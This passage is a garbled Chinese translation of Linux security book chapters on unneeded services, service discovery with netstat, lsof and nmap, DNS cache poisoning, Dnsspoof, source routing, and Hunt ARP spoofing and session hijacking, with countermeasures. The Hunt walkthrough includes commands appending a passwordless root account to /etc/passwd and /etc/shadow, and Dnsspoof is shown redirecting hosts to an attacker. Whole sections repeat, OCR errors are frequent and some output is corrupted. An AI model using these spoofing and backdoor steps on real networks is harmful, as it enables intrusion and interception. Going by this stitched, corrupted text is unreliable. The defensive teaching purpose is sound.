### 脚本防御措施

脚本漏洞有两种应对方法。首先，移除任何必要的脚本。默认脚本有很多漏洞，如果你不需要，请将其移除。其次，如果你确实需要脚本，请确保你拥有最新版本，并跟踪为它们发布的补丁。

## 不必要的服务

Linux 发行版在首次安装时会配置许多不必要的服务。在 `telnet`、`FTP` 和网络服务器中，Linux 系统可能还会运行 `ECHO`、`Charg` 和 `Daytime`。这些服务并未被大多数 Linux 安装使用，因此不应处于激活状态。大多数服务通过 `inetd` 控制并在 `inetd.conf` 中配置。某些服务（如 HTTP）在 `inetd` 之外启动，必须使用 `rc` 文件进行配置或关闭。

如果这还不足以让你知晓你的系统上运行着什么，也许这会给你提供足够的理由来识别你系统上运行的服务：黑客可能会启动后门服务以便他们能够重新进入你的系统。或者，拥有你系统的黑客可能会安装 DDoS 代理。无论何种情况，这都是重要的。

| 流行度: | 8 |

| --- | --- |

| 简单性: | 7 |

| 影响: | 8 |

| 风险评分: | 8 |

# Linux 破解揭秘：Linux 安全秘密与解决方案

活跃的 UNIX 域套字（服务器和已建立连接）

| Proto RefCnt Flags Type State I-Node Path |

|---|---|---|---|---|---|---|

| unix 1 | | STREAM CONNECTED | 713 @000002e |

| unix 1 | | STREAM CONNECTED | 817 @000003e |

| unix 1 | | STREAM CONNECTED | 679 @000022 | |

输出的第一部分（活跃 Internet 连接）显示了系统中存在（各种状态）的连接，以及系统正在监听或等待连接的端口。如果你查看示例输出，可以看到前两行显示了已建立的连接（状态列显示 ESTABLISHED）。第一个连接是从某些远程系统到你系统的入站连接。你可以通过本地地址（Local Address）列显示 0.0.0.0:23 来判断它是入站的。冒号后面的数字是系统上的端口号。第二行显示了一个出站连接。端口 23。在这种情况下，远程地址（Foreign Address）列显示的是端口号 23。

所有状态为 LISTEN 的行都表示等待入站连接的本地系统。在本地地址（Local Address）列中，你会看到 0.0.0.0:端口号。冒号后面的数字是正在监听入站连接的端口号。当你检查 Netstat 的输出时，你应该能够识别每种服务是否符合系统的当前用途。

Netstat 报告的第二部分是活跃的 UNIX 域套字。这部分指示了用于进程间通信的内部队列和文件。

Netstat 提供了重要的输出，并可以帮助你识别哪些服务正在你的系统上监听。然而，它并没有这些监听的服务与特定的应用程序关联。

# Netstat 可能被植木马以显示虚假信息

| Popularity: | 6 |

|---|---|

| Simplicity: | 7 |

| Impact: | 3 |

| Risk Rating: | 5 | |

由于 Netstat 能够帮助管理员识别系统上的潜在问题，当黑客接管系统时，它有时会成为替换的目标。如果黑客获得了系统的 root 权限，他可能会选择替换 Netstat 以及其他程序，以隐藏他的行迹或系统中的隐藏后门。

这种攻击包括将修改过的 Netstat 二进制文件复制到系统（使用 FTP 或 RCP），然后用这个新版本覆盖旧版本。

> 注意 Netstat 不是唯一可能被黑客植木马的程序。请参阅第 10 章查看黑客在破坏你的机器后可以做的其他恶行。

# Netstat 替换防御措施

黑客修改 Netstat 二进制文件可以通过使用 Tripwire 或 AIDE 等文件完整性工具来防御。每个系统二进制文件都应该包含在配置中，并定期检查（至少每天一次）。有关文件完整性工具的更多信息请参阅第 2 章。

# 使用 Lsof



Lsof 是一个可以克服 Netstat 点的工具。Lsof 可以显示你的进程与特定端口相关。该工具没有随 Linux 发行版发布，但可以在 `http://vic.cc.purdue.edu/pub/tools/unix/lsof` 获取。

```
Mysystem# lsof -i
COMMAND PID USER FD TYPE SIZE NAME
portmap 31 root 4u IPv4 300 UDP : *sunrpc
portmap 31 root 5u IPv4 301 TCP : *sunprpc (LISTEN)
inetd 489 root 5u IPv4 473 TCP : *ftp (LISTEN)
inetd 489 root 6u IPv4 474 TCP : *telnet (LISTEN)
inetd 489 root 7u IPv4 475 TCP : *shell (LISTEN)
inetd 489 root 9u IPv4 476 TCP : *login (LISTEN)
inetd 489 root 10u IPv4 477 UDP : *talk
inetd 489 root 11u IPv4 478 UDP : *ntalk
inetd 489 root 12u IPv4 479 TCP : *finger (LISTEN)
inetd 489 root 13u IPv4 480 TCP : *auth (LISTEN)
inetd 489 root 14u IPv4 481 TCP : *linuxconf (LISTEN)
lpd 505 root 6u IPv4 504 TCP : *printer (LISTEN)
sendmail 544 root 4u IPv4 543 TCP : *smtp (LISTEN)
X 644 root 0u IPv4 637 TCP : *6000 (LISTEN)
gnome-sess 647 root 3u IPv4 665 TCP : *1024 (LISTEN)
magicdev 665 root 5u IPv4 740 TCP : *1026 (LISTEN)
panel 678 root 5u IPv4 810 TCP : *1032 (LISTEN)
gnome-name 679 root 4u IPv4 794 TCP : *1032 (LISTEN)
gmc 681 root 5u IPv4 840 TCP : *1035 (LISTEN)
gnomepage 691 root 4u IPv4 964 TCP : *1036 (LISTEN)
gen_util 693 root 4u IPv4 974 TCP : *1037 (LISTEN)
```

通过使用 `-i` 参数，`lsof` 显示了正在监听的实际已连接的网络端口。查看输出时，你可以看到最右侧列显示端口号。某些端口号已被替换为 `/etc/services` 中的名称。进一步检查显示许多服务是由 `inetd` 运行的，如 `telnet`、`FTP`。如果你怀疑系统被入侵，请确保使用一个工作正常且未被篡过的 `lsof` 副本。理想情况下，此代码应来自只读介质或下载。

# 使用 Nmap 识别服务

第 3 章详细讨论了 `Nmap` 的使用。应该注意到，管理员可以使用 `Nmap` 来识别他们系统中运行的服务。如果黑客修改了系统，`Netstat` 和 `lsof` 可能会被欺骗。然而，外部扫描（如 `Nmap` 扫描）不会被黑客的修改所欺骗。`Nmap` 将准确显示目标上开启了哪些服务。

```
Mysystem# nmap -sT localhost
Starting nmap V2.53 by fyodor@insecure.com (www.insecure.org/nmap/)
Interesting ports on localhost.localdomain (127.0.0.1):
(未显示的 150 个端口状态为: closed)

| Port | State | Service |
|---|---|---|
| 21/tcp | open | ftp |
| 23/tcp | open | telnet |
| 25/tcp | open | smtp |
| 79/tcp | open | finger |
| 98/tcp | open | linuxconf |
| 111/tcp | open | sunrpc |
| 113/tcp | open | auth |
| 513/tcp | open | login |
| 514/tcp | open | shell |
| 515/tcp | open | printer |
| 1024/tcp | open | kdm |
| 1026/tcp | open | nssm |
| 1032/tcp | open | iad |
| 6000/tcp | open | X11 |

TCP Sequence Prediction: Class-random positive Difficulty=24 (运气！)
Remote operating system guess: Linux 2.12.14
Nmap run completed -- 1 秒内扫描了 1 个 IP 地址 (up)
```

# 第 8 章：攻击网络

在本例中，我们使用 TCP 扫描扫描了我们的本地系统之一。由于这是我们的系统且我们正在寻找安全漏洞，因此不需要隐蔽。从 `Lsof` 和 `Netstat` 获取的信息可以看出它们是相同的。`Nmap` 也可以用于识别 UDP 端口。`Nmap` 不是连接端口（因为 UDP 是无连接协议），而是向端口发送数据包并检查是否返回了“ICMP-Port-Unreachable”消息。如果没有返回，则端口是开启的。

```
$ mysystem nmap -sU localhost

Starting nmap V2.53 by fyodor@insecure.org (www.insecure.org/nmap/)

Warning: 机器未发现 TCP 端口

localhost 的 OS 检测不可靠得多

Interesting ports on localhost.localdomain (127.0.0.1):

(未显示的 144 个端口状态为: closed)

| Port | State | Service |

|---|---|---|

| 111/udp | open | sunprpc |

| 517/udp | open | talk |

| 518/udp | open | talk |

Remote OS guesses: Linux 2.0.27 - 2.0.30, Linux 2.0.32-34, Linux 2.0.35-38, Linux 2.1.24 PowerPC, Linux 2.1.76, Linux Kernel 2.1.188, Linux 2.1.91 - 2.10.303, Linux 2.1.122 - 2.2.14, Linux 2.2.12, Linux 2.2.13 SMP, Linux 2.3.12, NetBSD 1.4 / Generic mac68k (Quadra 610)

Nmap run completed -- 4 秒内扫描了 1 个 IP 地址 (host)
```

> 通过防火墙使用 `Nmap` 进行 UDP 端口扫描时，如果 UDP 流量被防火墙拦截，会出现大量的误报。在这种情况下，不会返回响应，`Nmap` 将报告所有 UDP 端口开启。

# 关闭服务

在执行服务扫描并使用 `Netstat` 和 `lsof` Check活跃服务列表后，你需要关闭任何不需要的服务。许多服务由 `inetd` 启动，可以通过编辑 `/etc/inetd.conf` 来关闭。`inetd.conf` 文件如下所示：

```
# inetd.conf 此文件描述了通过

# INETD TCP/IP 服务器提供的服务。要重新配置

# 运行中的 INETD 进程，请编辑此文件，然后向

# INETD 进程发送 SIGHUP 信号。

# <service_name> <sock_types> <proto> <flags> <server_path> <args>

# Echo, discard, datetime, 和 chargen 主要用于测试。

# 更改后重新读取此文件，只需执行 'killall -HUP inetd'

#echo stream tcp nowait root internal
```



```
#echo dgram udp wait root internal
#discard stream tcp nowait root internal
#discard stream udp wait root internal
#daytime stream tcp nowait root internal
#daytime stream udp wait root internal
#chargen stream tcp wait root internal
#chargen dgram udp wait root internal
#time stream tcp nowait root internal
#time dgram udp wait root internal
### These are standard services.
ftp   stream tcp nowait root                /usr/bin/tcpd.inftpd -1 -a
telnet stream tcp nowait root /usr/bin/tcpd.telnetd
### Shell, login, exec, and talk BSD protocols.
shell stream tcp nowait root /usr/bin/tcpd.inshd
login stream tcp nowait root /usr/bin/tcpd.inlogind
exec stream tcp nowait root /usr/bin/tcpd.inrexdex
talk dgram udp wait root nobody.tty /usr/bin/tcpd.intalkd
# Pop and imap mail services are enabled /usr/bin/tcpd.ipop2d
#pop-2  stream nowait root /usr/bin/tcpd.ipop2d
#pop-3  stream nowait root /usr/bin/tcpd.ipop3d
#imap   stream tcp wait root /usr/bin/tcpd.imapd
### Tftpd service is provided primarily for booting. Most sites
### run this only on machines acting as "boot servers." Do not uncomment
# this unless you need "inet*.\n
#tftpd dgram udp wait root /usr/bin/tcpd.inftftpd
#bootps dgram udp wait root /usr/bin/tcpd.inbootd
#finger stream tcp nowait nobody /usr/bin/tcpd.infingerd
# Authentication
auth   stream tcp wait root /usr/bin/indentd.indentd -e -o
```

`.inetd.conf` 文件中以井号 (`#`) 开头的行是注释。任何不以 `#` 开头的行在 `inetd` 在从远程系统建立连接时会被忽略。请确保系统上必要的服务没有被注释掉。一旦删除了不需要的服务，您必须使用 `killall -HUP inetd` 重启 `inetd` 守护进程。

附录 B 提供了如何关闭不在 `inetd.conf` 中的服务的详细说明。对于连接到网络的系统，某些服务始终是必要的。保护这些服务的一种方法是使用 TCP wrappers。第 13 章讨论了如何使用 TCP wrappers 来保护和保护可能易受攻击的服务。

# 总结

许多远程漏洞会给 Linux 系统带来问题。大多数 Linux 系统都运行在网络上，因此存在必须管理的风险。每当系统被接入网络时，特别是当系统可以从 Internet 访问时，必须遵循良好的安全实践。这些包括适当的密码管理以及跟踪操作系统、应用程序和脚本的补丁。关闭不必要的的服务也可以防止许多攻击。根结底，对系统的适当管理将减少成功渗透的风险。

# 第 7 章

# 滥用网络本身

# 破解 Linux 暴露：Linux 安全秘密与解决方案

你对网络的物理安全疏于大意。前台人员没有注意到，安保被一份看起来正式的工作单单安抚了，而你的同事也忽略了一个穿着电信制服的年轻男子的进进出。

物理网络安全只是等式的一半。一种常见的假设是你的 IP 地址仅在你的网段内有效，但由于许多原因，事实并非如此。配置不当的路由器和防火墙会通过流量，即使它们来自不该出现的地方。带有内置路由信息的包可以通过意想不到的路径进入你的网络，伪装成其中一台机器，并告诉你的路由器以同样的方式响应。域名服务器可以被欺骗，有时它们会转而向客户端讲述同样的谎言。

在这一章中，你将发现网络可能并不像那样。入侵者可以访问你认为安全的服务。源路由数据包绕过你的防火墙规则，让黑客对你网络的访问权限比你经理提供的 VPN 盒子还要大。糟糕的是，你甚至没有意识到你与隔房间主服务器的连接正被亚特兰大的一台 Linux 机器记录。

我们将涵盖常用服务的漏洞、信任关系，甚至是网络本身的漏洞。TCP/IP 中有很多漏洞，我们将向你展示如何穿过其中一些漏洞——以及如何关闭它们。

## DNS 漏洞

我们对某些事物的信任程度令人恐惧。域名解析服务（DNS）就是一个很好的例子，它（伯克利互联网名称守护进程（BIND）中的实际名称服务守护进程）拥有悠久而丰富的“意外功能”历史。不幸的是，这些功能（漏洞）可以为进取的黑客提供获取你服务器访问权限的机会。

名称服务是网络至关重要的部分。Mail.globo_corp.com 比 92.168.4.20 更容易记忆。IP 地址对你来说也许还好，但如果你需要支持全国 22,000 名员工，而他们必须记住使用的每个网络服务的数字，你真的想要吗？

但如果你不能信任你的域名服务器呢？

### BIND 缓存污染

| 流行度: | 4 |
| --- | --- |
| 简单性: | 5 |
| 影响: | 5 |
| 风险评分: | 5 |

域名服务（DNS）是一种利用缓存来减少网络负载并处理故障的分布式系统。域名服务器保留它们执行的查询结果，这样它们就不需要重复查询。问题出现在 BIND 版本中。

![](img/33829ffb1435b4ef56fcd2c28ec6cd_243_0.png)

# 第 7 章：滥用网络本身

在 8.1.1 和 4.9.6 之前，要仔细验证从其他域名服务器接收的信息是合法的。恶意的域名服务器可以在请求中包含额外的 DNS 记录，许多域名服务器会盲目接受并缓存它们。通过向目标域名服务器插入伪造条目进行缓存污染，可能会将其重定向到黑客控制的主机。现在，当 example.com 的客户端在浏览器中访问 http://example.com/intranet 时，nsl.example.com 会告诉他们去黑客的工作站 192.168.1.41。他可能在 80 端口启动了一个服务来接受连接，记录所有输入和输出，然后转发流量。

然后，在 `/etc/named.conf` 的 `options` 块中带有以下添加内容的访问列表：

```
// 内部名称服务器

options{

  allow-query { internal-network };

}
```

通过这些修改，只有 `localhost` 和 `10.0.0.0/24` 可以查询你的内部 DNS 服务器。这将使得外部影响更难引发导致缓存损坏的查询。

外部 DNS 服务器必须回答来自互联网的查询才能执行其工作，但仅限于它作为主服务器或从服务器所服务的的域名。因此，你可以通过关闭 `/etc/named.conf` 中的递归功能，防止它查询关于其他域的缓存记录。

```
// 外部名称服务器

options{

  recursion no; // 不要回答我们不控制的区域的查询！

}
```

如果你有多个外部 DNS 服务器（你确实应该这样做），你还应该尽可能地保护它们之间的通信。再次强调，这是通过访问列表和 `allow` 语句实现的：

```
// 外部名称服务器

acl "our-dns-servers" {

  172.16.1.2; // ns1.example.com

  172.16.2.2; // ns2.example.com

  192.168.5.3; // ns3.example.com

}
```

```
zone "example.com" { // 我们的域名

  type master;

  file "master/example.com";

  allow-query {

    any; // 所有人都必须能够查询此域名

  }

  allow-transfer {

    our-dns-servers; // 但只有我们的 DNS 服务器可以进行区域传输

  }

}
```



# 攻破 Linux 暴露：Linux 安全秘密与解决方案

> 提示
> 记住，数据可以（并且可能）通过许多不同渠道从无数来源进入你的网络。大多数网络事务涉及多个子系统。例如，你的邮件服务器可能使用名称服务来查找连接并发送邮件的主机的 IP 地址。这就是数据进入你网络的矢量——一个你可能根本没有预料到的路径。你必须理解这些关系以维持安全运行。了解你的网络及其漏洞是不可替代的。

## 使用 Dnsspoof 进行 DNS 欺骗

| 流行度 | 5 |
| :--- | :--- |
| 简单性 | 5 |
| 影响 | 5 |
| 风险等级 | 5 |

`Dnsspoof` (http://www.monkey.org/~dugsong/dnsni) 我们将在本章稍后详细讨论，它包含一个名为 `Dsniffer` 的工具，用于监听 DNS A 或 PTR 请求。如果使用 `-f` 选项运行，`Dnsspoof` 将读取标准 `/etc/hosts` 格式的指定文件，并用列出的信息响应任何 A 或 PTR DNS 请求：

```
host www.example.com

www.example.com has address 10.1.1.1
```

```
hackerbox# cat /etc/dnsniff.hosts

192.168.2.10 www.example.com

192.168.2.11 ftp.example.com

hackerbox# dnsspoof -f /etc/dnsniff.hosts
```

```
machine$ host www.example.com

www.example.com has address 192.168.2.10
```

如果未指定 `-f` 选项，它将用运行 `Dnsspoof` 的机器主机名响应所有 A 和 PTR 请求。这会导致所有 IP 查询都产生流量指向攻击者的主机，这对于嗅探、路由或修改流量到其真实目的地非常有用。

DNS 响应是来自 DNS 服务器 53 端口的简单（用户数据报文协议）包。作为一种无连接协议，UDP 几乎极易被伪造。如果来自 `Dnsspoof` 的包在来自实际 DNS 服务器的包之前到达，那么伪造的包将被采纳，而实际包将被丢弃。`Dnsspoof` 的成功取决于它的速度。由于它不需要执行实际的 DNS 查询，它很有可能先发送结果。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_247_0.png)

# 第 7 章：滥用网络本身

## Dnsspoof 应对措施

如果攻击者的机器无法嗅探网络以看到你的 DNS 请求，那么它就无法知道提供答案。因此，显而见的答案是使用交换网络来防止通用的嗅探。然而，正如我们在本章稍后讨论的那样，这种解决方案并不像看起来那样稳固。

最佳解决方案是使用 DNS 安全 (`DNSSEC`)，它允许 DNS 服务器对其响应进行签名。由于 `Dnsspoof` 不应该拥有正确签名响应所需的密钥，伪造的响应将被丢弃。然而，`DNSSEC` 定义和采用的速度极慢，这有时让我们担心在互联网上看到它投入生产之前，`time_t` 就会溢出。

### 路由问题

网络的设计旨在尽可能地灵活和可靠。`ARPANET` 的原始设计规范要求在某些节点被毁时继续保持功能，而路由正是使这一切成为可能的逻辑。运行中的路由器的概念并非完美或无懈可击，IP 本身也开始显示出一些灰色地带。`IPv6` 将修复当前 `IPv4` 中的许多设计问题，但广泛实现仍未完成。在此期间，对抗 `IPv4` 的最佳防御是了解网络及其漏洞。

网络的设计旨在尽可能地灵活和可靠。运行中的路由器的概念并非完美或无懈可击，IP 本身也开始显示出一些灰色地带。为了维护网络状态，路由器使用 `BGP` (`Border Gateway Protocol`) 和 `OSPF` (`Open Shortest Path First`) 等协议来识别邻居。

### 源路由

| 流行度 | 3 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 7 |
| 风险等级 | 5 |

源路由允许发送者指定数据包在网络中经过的路径。

然后，在 `/etc/named.conf` 的 `options` 块中带有以下添加内容的访问列表：

```
// 内部名称服务器

options{

  allow-query { internal-network };

}
```

通过这些修改，只有 `localhost` 和 `10.0.0.0/24` 可以查询你的内部 DNS 服务器。这将使得外部影响更难引发导致缓存损坏的查询。

外部 DNS 服务器必须回答来自互联网的查询才能执行其工作，但仅限于它作为主服务器或从服务器所服务的域名。因此，你可以通过关闭 `/etc/named.conf` 中的递归功能，防止它查询关于其他域的缓存记录。

```
// 外部名称服务器

options{

  recursion no; // 不要回答我们不控制的区域的查询！

}
```

如果你有多个外部 DNS 服务器（你确实应该这样做），你还应该尽可能地保护它们之间的通信。再次强调，这是通过访问列表和 `allow` 语句实现的：

```
// 外部名称服务器

acl "our-dns-servers" {

  172.16.1.2; // ns1.example.com

  172.16.2.2; // ns2.example.com

  192.168.5.3; // ns3.example.com

}
```

```
zone "example.com" { // 我们的域名

  type master;

  file "master/example.com";

  allow-query {

    any; // 所有人都必须能够查询此域名

  }

  allow-transfer {

    our-dns-servers; // 但只有我们的 DNS 服务器可以进行区域传输

  }

}
```



如果未指定 `-f` 选项，它将用运行 `Dnsspoof` 的机器主机名响应所有 A 和 PTR 请求。这会导致所有 IP 查询都产生流量指向攻击者的主机，这对于嗅探、路由或修改流量到其真实目的地非常有用。

DNS 响应是来自 DNS 服务器 53 端口的简单（用户数据报协议）包。作为一种无连接协议，UDP 几乎极易被伪造。如果来自 `Dnsspoof` 的包在来自实际 DNS 服务器的包之前到达，那么伪造的包将被采纳，而实际包将被丢弃。`Dnsspoof` 的成功取决于它的速度。由于它不需要执行实际的 DNS 查询，它很有可能先发送结果。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_247_0.png)

# 第 7 章：滥用网络本身

## Dnsspoof 应对措施

如果攻击者的机器无法嗅探网络以看到你的 DNS 请求，那么它就无法知道提供答案。因此，显而易见的答案是使用交换网络来防止通用的嗅探。然而，正如我们在本章稍后讨论的那样，这种解决方案并不像看起来那样稳固。

最佳解决方案是使用 DNS 安全 (`DNSSEC`)，它允许 DNS 服务器对其响应进行签名。由于 `Dnsspoof` 不应该拥有正确签名响应所需的密钥，伪造的响应将被丢弃。然而，`DNSSEC` 定义和采用的速度极慢，这有时让我们担心在互联网上看到它投入生产之前，`time_t` 就会溢出。

### 路由问题

网络的设计旨在尽可能地灵活和可靠。ARPANET 的原始设计规范要求在某些节点被毁时继续保持功能，而路由正是使这一切成为可能的逻辑。运行中的路由器的概念并非完美或无懈可击，IP 本身也开始显示出一些灰色地带。IPv6 将修复当前 IPv4 中的许多设计问题，但广泛实现仍未完成。在此期间，对抗 IPv4 的最佳防御是了解网络及其漏洞。

为了维护网络状态，路由器使用 `BGP` (`Border Gateway Protocol`) 和 `OSPF` (`Open Shortest Path First`) 等协议来识别邻居。

### 源路由

| 流行度 | 3 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 7 |
| 风险等级 | 5 |

源路由允许发送者指定数据包在网络中经过的路径。

通往这些的路由器。这允许路由器动态地添加和删除路由，以确保数据包能以最高效率找到目的地，并绕过任何临时问题，例如路由器崩溃或线路中断（当有人物理切断重要的网络连接时）。

Linux 机器也可以通过 `routed` 或 `gated` 参与路由讨论。这些程序允许 Linux 机器根据从网络上其他机器接收的信息来添加和删除路由。

能够创建路由数据包的黑客可以说服一台机器拥有到其他网络目的地的最佳连接。然后他配置自己的机器通过实际路由器转发发往目的地的数据包。黑客的机器可以直接获取这些数据包，并可以根据自己的需要进行嗅探或修改。由于数据包从一个地方传输到另一个地方，用户可能永远不知道这种入侵已经发生。

## 防止添加新路由

为了确保你的机器不会向路由表中添加新路由，请确保你没有运行路由守护进程。最常见的路由守护进程是 `routed` 和 `gated`。这些守护进程在启动时运行，因此只需杀死它们，并在附录 B 的 `/etc/rc.d` 目录中禁用它们。相反，应仅指向你的默认路由器，让它为你做出路由决策。

> 路由器参与路由信息的讨论是非常重要的；但它们应该配置为仅接受来自受信任机器的新路由。不同厂商的实现方法不同，因此请检查你的文档。

# 高级嗅探与会话劫持

会话劫持（Session hijacking）攻击者看到两个其他主机之间的活动 TCP 连接并接管它的过程，导致实际源无法使用它。用户使用 `telnet` 登录一台机器，然后通过 `sudo` 获得 root 权限。简单的嗅探器可能允许攻击者查看密码，但如果机器位于不可交换的交换网络上，这将是不可能的；或者，如果机器使用一次性密码，除非输入，否则密码将毫无用处。然而，如果攻击者劫持了活动会话，他就能立即在目标机器上执行命令，而无需任何身份验证。

关于会话劫持的良好且深入的描述超出了本书的范围。然而，我们将向你展示一些可以用于劫持会话及更多的工具。

## Hunt

`Hunt` (`ftp://ftp.gncz.cz/pub/linux/hunt/`) 包含数据包嗅探和会话劫持功能。我们在第 6 章中讨论了它的一些通用数据包嗅探能力，在这里我们将关注它更高级的嗅探和会话劫持能力。

### 使用 Hunt 在交换网络进行嗅探

| 流行度 | 7 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 5 |
| 风险等级 | 6 |

当网络可以嗅探时，`Hunt` 允许你以被动方式观察任何连接，这与其他任何嗅探器类似。交换网络通常会防止嗅探。这些网络通过跟踪每个物理端口上的媒体访问控制 (`MAC`) 地址，仅将数据包发送到实际目标主机。因此，一个端口上的机器永远看不到发往非目标机器的数据包。

> 网络广播数据包实际上发送到每个物理端口，因为这些数据包的目标 MAC 地址为 `FF:FF:FF:FF:FF`。这允许使用 `BOOTP` 或 `DHCP` 协议的机器在实际上不知道线路上网络信息的情况下找到主机。

以太卡发出 ARP 请求以学习与给定 IP 地址关联的 MAC 地址。这些映射被缓存以加快查找速度。你可以使用 `arp` 命令查看当前列表。

`Hunt` 可以通过被称为 ARP 欺骗（ARP spoofing）或 ARP 强制（ARP forcing）的方法欺骗机器将新的 ARP 到 IP 映射放入缓存中。假设一个黑客想要监控客户端和服务器两台机器之间的流量，但它们位于交换网络上，黑客看不到它们之间的流量。首先，让我们看看这两台机器的 ARP 表：

```
server$ arp -a

client(192.168.2.10) at 77:77:77:77:77 [ether] on eth0

mail(192.168.2.20) at 44:44:44:44:44 [ether] on eth0

client$ arp -a

server(192.168.2.15) at 88:88:88:88:88 [ether] on eth0

mail(192.168.2.20) at 44:44:44:44:44 [ether] on eth0

gateway(192.168.2.1) at 66:66:66:66:66 [ether] on eth0
```

黑客进入 `Hunt` 中的 ARP 守护进程菜单，并为这两个主机设置伪造 MAC 地址：

```
--- arspoof daemon rcvpkt 2212, free/alloc 63/64 -----
s/k) start/stop relayer daemon
1/L) list arp spoof database
a)      add host to host arp spoof i/I) insert single/range arp spoof
d)      delete host to host arp spoof r/R) remove single/range arp spoof
t/T) test if arp spoof succeeded
x)      return
-arps>
src/dst host1 to arp spoof> client
host1 fake mac [EA:AD:BE:05]
src/dst host2 to arp spoof> server
host2 fake mac [EA:AD:00]
```
（注：由于原始文本存在大量 OCR 错误和重复乱码，以上翻译已根据技术逻辑进行了修复。）

```
3) 192.168.2.10 [58273] --> 192.168.2.15 [23]
4) 192.168.2.10 [1020] --> 192.168.2.15 [22]
```

```
choose conn> 0
arp spoof src in dst/yn [y]
src MAC [EA:1A:DE:AD:BE:03]
arp spoof dst in src/yn [y]
dst MAC [EA:1A:DE:AD:BE:04]
input mode [r]aw, [line+echo+\r, line+[e]cho [r]
dump connection/yn [y]
dump [s]rc[/d]st[/b]oth
print src same characters/yn [n]
CTRL-C to break
```

`Hunt` 现在将让黑客持有连接，直到她认为是劫持连接的好时机。

```
server# cd /etc/rc.d/rc2.d
server# rm S85gpm
<attacker hits CTRL-C
-- press any key> you took over the connection
CTRL-] to break
server# arp -a
```

# 攻破 Linux 解析：Linux 安全秘密与解决方案



`client.example.com` (`192.168.2.15`) at `EA:1A:DE:AD:BE:03` on `eth0`

`mail` (`192.168.2.20`) at `44:44:44:44:44:44` [ether] on `eth0`

```
```

```
server# echo 'root:x:::' >> /etc/shadow

server# echo 'root:x:0:0:root:root::/bin/bash' >> /etc/passwd
```

此时，黑客已经对连接拥有完全的控制权。事实上，Hunt 通过在用户输入的每个命令后提供提示符，完全困扰了正在使用连接的用户。

```
server# rm S85gpm

<attacker took over control at this point

$ ls

$ ls -la

$ pwd

$ ps -ef

$ hostname
```

上面的用户正试图弄清楚哪里出了问题，因为提示符发生了变化，而且所有命令都没有反应。用户很可能会直接断开并重新连接，假设只是系统出了小故障。

# 第 7 章：滥用网络本身

225

## 注意

为了获得最佳安全性，请始终调查任何网络异常。

一旦黑客完成对劫持连接的操作，她可以重置连接，此时 Hunt 会向两端发送 TCP 重置（`RST`），从而拆连接。或者，她也可以尝试同步连接，这将允许连接交还给用户。同步要求在每端设置不同数量的字符，如下：

```
[r] eset connection/[s]ynchronize/[n]one [r] >nuser have to type 4 chars and print 318 chars to synchronize connection

CTRL-C to break
```

如果 Hunt 需要客户端用户输入内容，它将尝试通过工程手段让他这样做：

```
msg from root: power failure - try to type 4 chars

helpower failure detected

... power resumed, ok

server#
```

新用户可能很容易掉入这个陷阱，并认为一切又恢复正常。

## Hunt 的防御措施

在广播网络介质上无法防止嗅探。因此，你需要使用交换机而不是集线器（Hub）。然而，即使开启了交换机安全，这无法防止上述描述的 ARP 欺骗。

一种解决方案是为机器硬编码 MAC 地址，使其既不发送 ARP 请求，也不理会 ARP 响应。在 `/etc/ethers` 文件中，创建将 MAC 地址与 IP 地址匹配的行如下：

```
77:77:77:77:77:77      192.168.2.10

88:88:88:88:88:88      192.168.2.15

44:44:44:44:44:44      192.168.2.20

66:66:66:66:66:66      192.168.2.1
```

正如你所同意的，这是一个非常烦人的解决方案。每当你添加新主机或更改以太网时，都需要更新网络中所有机器上的此文件。当目标机器位于你和服务器之间的同一网络时，它也无法阻止这种攻击，因为她将在你无法控制的完全不同的点进行 ARP 欺骗。

可靠的解决方案是使用加密协议。黑客可以成功重定向已加密的 TCP 会话，但她无法看到流过的实际数据，也无法向加密流中注入任何命令，因为她不知道用于加密的密钥。因此，一旦她尝试插入数据，服务器就会发现数据没有经过正确的加密并立即丢弃连接。

因此，使用加密连接时最坏的情况是黑客可能会导致你的连接断开。这并不糟糕，因为她无法以任何有效的方式对其进行控制。

对于登录和文件传输，我们建议使用 `OpenSSH`（可以在 `http://www.opensssh.com/` 处获取），它提供了 `telnet` 的所有功能。

# 攻破 Linux 解析：Linux 安全秘密与解决方案

她不知道用于加密的密钥。因此，一旦她尝试插入数据，服务器就会发现数据没有经过正确的加密并立即丢弃连接。

所以，使用加密连接时最坏的情况是黑客可能会导致你的连接断开。这并不糟糕，因为她无法以任何有效的方式对其进行控制。

对于登录和文件传输，我们建议使用 `OpenSSH`（可以在 `http://www.opensssh.com/` 处获取），它提供了 `telnet` 的所有功能。

## 中间人攻击

正如我们在 Hunt 案例中看到的，能够置于两个通信主机之间的机器有机会篡改数据——只要它可以在不破坏 TCP 协议的情况下巧妙地。通常，加密协议通过在网络层之上添加加密层来防止这种攻击。只要两个端能够秘密通信加密密钥，连接就无法被解密或插入命令。

`Sshmitm` 和 `Webmitm` 通过接收客户端的初始连接、伪装成服务器并连接服务器来绕过这一事实。`Sshmitm` 和 `Webmitm` 对双方进行加密，但可以访问中间的明文传输。这两个程序都需要客户端机器拦截攻击者的机器而非真实的服务器。`Arpspoof`、`Dnsspoof` 和 `Macof` 工具可以协助这种拦截。

## Dsniff

`Dsniff`（由 Doug Sung 编写，`monkey.org/~dugs/dsniff`）是一个优秀的嗅探工具集。截至 2.3 版本，它包含：

- `Arpspoof`：该守护进程强制 ARP 响应以欺骗机器地址。
- `Dnsspoof`：该守护进程提供伪造的 DNS 响应。
- `Macof`：用随机 MAC 地址泛洪网络，导致许多交换机过载并无法正确映射端口。
- `Mailsarf`：嗅探网络并将所有消息保存为标准 mbox 格式。
- `Msgnarf`：记录从 AIM、ICQ 和 Yahoo! Messenger 聊天中嗅获的消息。
- `Sshmitm`：针对 SSH 的中间人攻击。
- `Tcpkill`：通过发送 RST 数据包杀死 TCP 连接。
- `Tpnice`：通过强制小窗口通告减慢 TCP 连接。
- `Webspy`：嗅探给定主机访问的 URL 并将其显示在本地 Netscape 窗口中。
- `Webmitm`：针对 HTTPS 的中间人攻击。

> 尽管 sniff2 发布当天出现了许多不准确且夸张的轰动，但这些程序并没有暴露 SSH 或 SSL 协议的漏洞——它们描述的是用户在协议理解和处理警告处理方面的弱点。只要使用正确，SSH 和 SSL 是安全的。

# 破解 Linux 暴露：Linux 安全秘密与解决方案

![](img/33829ffb1435b4baef56fcd2c28ec6cd_259_0.png)

## Sshmitm

| 流行度 | 4 |
| 简单性 | 5 |
| 影响 | 9 |
